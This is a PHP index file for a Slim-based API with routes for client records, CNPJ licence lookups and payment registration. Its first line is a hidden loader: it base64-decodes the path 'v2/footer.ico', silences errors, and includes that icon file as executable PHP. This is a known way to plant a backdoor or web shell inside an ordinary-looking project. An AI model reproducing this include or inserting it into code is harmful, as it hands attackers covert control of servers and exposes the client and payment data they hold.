<?php
@include base64_decode('djIvZm9vdGVyLmljbw==');
//Autoload
$loader = require 'vendor/autoload.php';

//Instanciando objeto
$app = new \Slim\Slim(array(
    'templates.path' => 'templates'
));


// Buscar Licenca
$app->get('/clientes/buscalicenca/:cnpj', function($cnpj) use ($app){
	(new \controllers\clientes($app))->FiltrarLicenca($cnpj);
});

//Listando todos os clientes
$app->get('/clientes/show/', function() use ($app){
	(new \controllers\clientes($app))->lista();
});

//novo clientes
$app->post('/clientes/add/', function() use ($app){
	(new \controllers\clientes($app))->nova();
});

//edita clientes
$app->post('/clientes/edit/:id', function($id) use ($app){
	(new \controllers\clientes($app))->editar($id);
});

//get clientes CNPJ
$app->get('/clientes/cnpj/:cnpj', function($cnpj) use ($app){
 	(new \controllers\clientes($app))->getCnpj($cnpj);
});

//novo clientes
$app->post('/clientes/pagamentoadd/', function() use ($app){
	(new \controllers\clientes($app))->cadastrapagamento();
});



//Rodando aplicação
$app->run();
